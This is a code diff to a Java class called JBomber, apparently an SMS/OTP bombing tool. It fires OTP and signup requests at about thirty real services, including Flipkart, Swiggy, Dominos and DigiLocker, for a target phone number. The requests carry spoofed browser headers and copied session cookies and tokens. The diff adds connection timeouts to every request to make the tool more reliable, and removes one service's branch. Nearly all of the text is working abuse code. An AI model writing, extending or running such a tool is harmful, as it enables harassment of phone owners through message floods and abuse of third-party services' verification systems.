@@ -12,6 +12,8 @@ public class JBomber {
 		if (count == 1) {
 			HttpURLConnection con = (HttpURLConnection) new URL("https://rome.api.flipkart.com/api/7/user/otp/generate")
 					.openConnection();
+					
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept", "*/*");
 			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
@@ -44,6 +46,7 @@ public class JBomber {
 			HttpURLConnection con = (HttpURLConnection) new URL(
 
 					"https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN").openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept", "application/json, text/plain, */*");
 			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
@@ -73,6 +76,7 @@ public class JBomber {
 		else if (count == 3) {
 			HttpURLConnection con = (HttpURLConnection) new URL(
 					"https://apiv2.sonyliv.com/AGL/1.4/A/ENG/WEB/IN/CREATEOTP").openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept", "application/json, text/plain, */*");
 			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
@@ -105,6 +109,7 @@ public class JBomber {
 			HttpURLConnection con = (HttpURLConnection) new URL(
 
 					"https://drive.olacabs.com/oauth/api/v2/web/auth/preauth").openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept", "application/json, text/plain, */*");
 			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
@@ -135,6 +140,7 @@ public class JBomber {
 
 		else if (count == 5) {
 			HttpURLConnection con = (HttpURLConnection) new URL("https://www.meru.in/register").openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept",
 					"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
@@ -169,6 +175,7 @@ public class JBomber {
 		else if (count == 6) {
 			HttpURLConnection con = (HttpURLConnection) new URL(
 					"https://secure.yatra.com/social/common/yatra/sendMobileOTP").openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept", "application/json, text/javascript, */*; q=0.01");
 			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
@@ -200,6 +207,7 @@ public class JBomber {
 		else if (count == 7) {
 			HttpURLConnection con = (HttpURLConnection) new URL("Https://unacademy.com/api/v3/user/user_check/")
 					.openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept", "*/*");
 			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
@@ -230,6 +238,7 @@ public class JBomber {
 		else if (count == 8) {
 			HttpURLConnection con = (HttpURLConnection) new URL(
 					"https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/").openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept", "application/json");
 			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
@@ -259,6 +268,7 @@ public class JBomber {
 		else if (count == 9) {
 			HttpURLConnection con = (HttpURLConnection) new URL("https://www.1mg.com/auth_api/v4/create_token")
 					.openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept", "application/vnd.healthkartplus.v11+json");
 			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
@@ -290,6 +300,7 @@ public class JBomber {
 		else if (count == 10) {
 			HttpURLConnection con = (HttpURLConnection) new URL("https://api.dominos.co.in/loginhandler/forgotpassword")
 					.openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept", "application/json, text/plain, */*");
 			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
@@ -325,6 +336,7 @@ public class JBomber {
 		else if (count == 11) {
 			HttpURLConnection con = (HttpURLConnection) new URL(
 					"https://www.freshmenu.com/api/users/2427783/get_otp/" + phone + "").openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("GET");
 			con.setRequestProperty("Accept",
 					"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
@@ -347,6 +359,7 @@ public class JBomber {
 		else if (count == 12) {
 			HttpURLConnection con = (HttpURLConnection) new URL("https://www.swiggy.com/dapi/auth/signup")
 					.openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("__fetch_req__", "true");
 			con.setRequestProperty("Accept", "*/*");
@@ -375,6 +388,7 @@ public class JBomber {
 		else if (count == 13) {
 			HttpURLConnection con = (HttpURLConnection) new URL("https://api.pizzahut.io/v1/otp/generate")
 					.openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept", "*/*");
 			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
@@ -400,6 +414,7 @@ public class JBomber {
 		else if (count == 14) {
 			HttpURLConnection con = (HttpURLConnection) new URL(
 					"https://jsso.indiatimes.com/sso/crossapp/identity/web/registerUser").openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept", "*/*");
 			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
@@ -427,38 +442,12 @@ public class JBomber {
 			con.getResponseCode();
 		}
 
-		else if (count == 15) {
-			HttpURLConnection con = (HttpURLConnection) new URL(
-					"https://www.oyorooms.com/api/pwa/generateotp?locale=en").openConnection();
-			con.setRequestMethod("POST");
-			con.setRequestProperty("Accept", "*/*");
-			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
-			con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
-			con.setRequestProperty("channel", "timesprime");
-			con.setRequestProperty("content-length", "51");
-			con.setRequestProperty("content-type", "text/plain;charset=UTF-8");
-			con.setRequestProperty("cookie",
-					"mab=20091fd9daacd73a8dc3b1be23bf64e6; expd=mww2%3A1%7CBnTc%3A0%7Cnear%3A0%7Cioab%3A1%7Cmhdp%3A1%7Cbcrp%3A0%7Cpwbs%3A1%7Cmwsb%3A0%7Cslin%3A0%7Chsdm%3A1%7Clpex%3A0%7Clphv%3A0%7Cdpcv%3A0%7Cgmab%3A0%7Curhe%3A0%7Cprdp%3A1%7Ccomp%3A0%7Csldw%3A1%7Cmdab%3A0%7Cnrmp%3A1%7Cnhyw%3A1%7Cwboi%3A1%7Csst%3A1; appData=%7B%22userData%22%3A%7B%22isLoggedIn%22%3Afalse%7D%7D; token=dUxaRnA5NWJyWFlQYkpQNnEtemo6bzdvX01KLUNFbnRyS3hfdEgyLUE%3D; _ga=GA1.2.105616807.1593078238; _gid=GA1.2.893948467.1593078238; _csrf=wIKp3JCO-hwyMScSmhgJJiaV; acc=IN; X-Location=georegion%3D104%2Ccountry_code%3DIN%2Cregion_code%3DHR%2Ccity%3DHARYANA%2Clat%3D29.62%2Clong%3D76.98%2Ctimezone%3DGMT%2B5.50%2Ccontinent%3DAS%2Cthroughput%3Dvhigh%2Cbw%3D5000%2Casnum%3D45609%2Cnetwork_type%3Dmobile%2Clocation_id%3D0; _uid=Not%20logged%20in; XSRF-TOKEN=GNve2nuO-DNChkhaP9GhUb1im8686k1ZN6M0; bm_sz=E86E7C66CEF60DEFD8ED734343CA28BD~YAAQbZxMF9sT7N5yAQAAACqQ7ghrsUaK7eIMgMTj19oSy3wrcvQANdlf6TmMxQgw6FZUoXQk+GM8YWNEFouzdLsO38nj4jbVFA0hHDt3i8VlGXRHd3G6BlfmmrZVBiO6PzPF9ZQQ+fpbxZA53B5UDx8L5BBaCT4xsXCB9aZ1+DsW2YwJiMMjScGyLuZThXcnxg==; fingerprint2=61e072659b7a8f4d1ca8fa00b9a459ea; _abck=3432A952E97BBC8DA76C79DCED204593~0~YAAQbZxMFzQV7N5yAQAAylOQ7gSg3+9jh8XFrnWvN9dLZK9SCfLXCkwdPvS6C7FFFvbhwGEKOl2TGURcTUCr0HCB8EDBXCttiX3ESnQWO+gWWPwzoXMLlII0bDNQWyMY40mXppsgX70pEZvglkQRlWfHF8N7xVE0P+f22tIELfhcPI8JVAWYmilu/Y+3Rha5UzAznCB+2uLEB8ukoCNTpZlqynoX9fIFfpgePrmSGewgVj2vMSWt7QRMlbsr4kL0emU/2aEJZBnPuu9eiWR8QkZhR4+WyTsPiidMDqVyNip43nREVICUmMKBRHFGwpZ9XJdUBJCmPYfI~-1~-1~-1; ak_bmsc=AF533B39AA20CDCCB6ADF330B4AECFE0174C9C6D380600006464F55E8104BE0E~plkt6mQUMULavq0Y9g6U7WvqgbkPs5SXyO4GBiP640cMdagLuMLBX4QjEfrBP0Wbo9kmDCtZHU+pPFP1rQtWA4p8y9y1lSng9ifhWAIfXpkfQn9A+DzNLUYQme1RkNyl9hvs883KEmp53SyD5Y/UY8KAUPWXSUfa8tIcRIxXQuaC6FtmUqX5LC7zd/ourdKJM19GXDhZjWNSuTeDRW85he/p8+Wo/JJ3C6TyIXJ/RdGICmzhU2rZ7aBf57+VabQRxl; _gcl_au=1.1.1137040916.1593140367; tvc_utm_source=duckduckgo.com; tvc_utm_medium=referral; tvc_utm_campaign=referral; tvc_utm_key=(not set); tvc_utm_content=(not set); AMP_TOKEN=%24NOT_FOUND; moe_uuid=5c3c9074-e172-4716-9c49-92439b16a200; _fbp=fb.1.1593140383060.2011327727; bm_sv=1173965FC3F19F53A8B8F39C75D8ECCA~6G/0s61yJkDcAgR2YEluraXWre/cMnQhQrZQdup4BIT+zdGWovaPrWbM23vCB2jks/s95l9RssEmnBNP5/+eEPxIe+ZCsJ1q/eb4VmywRBpwNI86/ThcDmPA6ZVW7NEtceEd4NmdKrV579gnL2b4GvgcnQDo2lGtW3B4XHKC5sE=; _uetsid=b1c4a8ab-2dc4-dd60-b480-ead8e912a6d5; _uetvid=dd1dbc53-c548-2534-b326-d2d02c08c21c; _gat=1");
-			con.setRequestProperty("origin", "https://www.oyorooms.com");
-			con.setRequestProperty("referer", "https://www.oyorooms.com/login?country=&retUrl=/");
-			con.setRequestProperty("sec-fetch-dest", "empty");
-			con.setRequestProperty("sec-fetch-mode", "cors");
-			con.setRequestProperty("sec-fetch-site", "same-origin");
-			con.setRequestProperty("user-agent",
-					"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Mobile Safari/537.36");
-			con.setRequestProperty("xsrf-token", "GNve2nuO-DNChkhaP9GhUb1im8686k1ZN6M0");
-			String jason = "{\"phone\":\"" + phone + "\",\"country_code\":\"+91\",\"nod\":4}";
-			con.setDoOutput(true);
-			try (OutputStream os = con.getOutputStream()) {
-				os.write(jason.getBytes());
-			} catch (Exception e) {
-			}
-			con.getResponseCode();
-		}
+		
 
 		else if (count == 16) {
 			HttpURLConnection con = (HttpURLConnection) new URL("https://www.dineout.co.in/xhr-request/user_signup")
 					.openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept", "*/*");
 			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
@@ -488,6 +477,7 @@ public class JBomber {
 		else if (count == 17) {
 			HttpURLConnection con = (HttpURLConnection) new URL("https://accounts.digitallocker.gov.in/signup/send_otp")
 					.openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept", "*/*");
 			con.setRequestProperty("content-length", "25");
@@ -510,6 +500,7 @@ public class JBomber {
 		else if (count == 18) {
 			HttpURLConnection con = (HttpURLConnection) new URL(
 					"https://accounts.box8.co.in/customers/sign_up?origin=box8").openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept", "application/json, text/plain, */*");
 			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
@@ -540,6 +531,7 @@ public class JBomber {
 		else if (count == 19) {
 			HttpURLConnection con = (HttpURLConnection) new URL(" https://www.cure.fit/api/auth/loginPhoneSendOtp")
 					.openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept", "application/json");
 			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
@@ -570,6 +562,7 @@ public class JBomber {
 		else if (count == 10) {
 			HttpURLConnection con = (HttpURLConnection) new URL(
 					"https://gaanajsso.indiatimes.com/sso/crossapp/identity/web/getLoginOtp").openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept", "*/*");
 			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
@@ -598,6 +591,7 @@ public class JBomber {
 		else if (count == 21) {
 			HttpURLConnection con = (HttpURLConnection) new URL(
 					"https://www.firstcry.com/m/register?URL=https://www.firstcry.com").openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept",
 					"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
@@ -631,6 +625,7 @@ public class JBomber {
 			HttpURLConnection con = (HttpURLConnection) new URL(
 					"https://www.limeroad.com/auth/get_uuid_v2?ajax=true&ret=https://www.limeroad.com/auth/login?ajax=true&mobileOnly=false&doAction=")
 							.openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept", "*/*");
 			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
@@ -659,6 +654,7 @@ public class JBomber {
 		else if (count == 23) {
 			HttpURLConnection con = (HttpURLConnection) new URL("https://www.snapdeal.com/signupAjax/")
 					.openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept", "application/json, text/javascript, */*; q=0.01");
 			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
@@ -690,6 +686,7 @@ public class JBomber {
 			HttpURLConnection con = (HttpURLConnection) new URL(
 					"https://api.fynd.com/auth/auth/login-or-register/otp?platform=000000000000000000000001")
 							.openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept", "application/json, text/plain, */*");
 			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
@@ -718,6 +715,7 @@ public class JBomber {
 		else if (count == 25) {
 			HttpURLConnection con = (HttpURLConnection) new URL("https://user.vedantu.com/user/preLoginVerification")
 					.openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept", "*/*");
 			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
@@ -746,6 +744,7 @@ public class JBomber {
 		else if (count == 26) {
 			HttpURLConnection con = (HttpURLConnection) new URL("https://students.byjus.com/mobiles/sign_up")
 					.openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept",
 					"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
@@ -779,6 +778,7 @@ public class JBomber {
 		else if (count == 27) {
 			HttpURLConnection con = (HttpURLConnection) new URL("https://mail.protonmail.com/api/users/code")
 					.openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept", "application/vnd.protonmail.v1+json");
 			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
@@ -809,6 +809,7 @@ public class JBomber {
 		else if (count == 28) {
 			HttpURLConnection con = (HttpURLConnection) new URL("https://mewe.com/api/v2/validation/phone/send")
 					.openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept", "*/*");
 			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
@@ -837,6 +838,7 @@ public class JBomber {
 		else if (count == 29) {
 			HttpURLConnection con = (HttpURLConnection) new URL("https://www.skout.com/api/1/auth/verify-phone")
 					.openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept", "application/json, text/plain, */*");
 			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
@@ -864,6 +866,7 @@ public class JBomber {
 		else if (count == 30) {
 			HttpURLConnection con = (HttpURLConnection) new URL("https://app.trulymadly.com/api/v2/auth/otp/send")
 					.openConnection();
+			con.setConnectTimeout(5000);
 			con.setRequestMethod("POST");
 			con.setRequestProperty("Accept", "application/json, application/json");
 			con.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
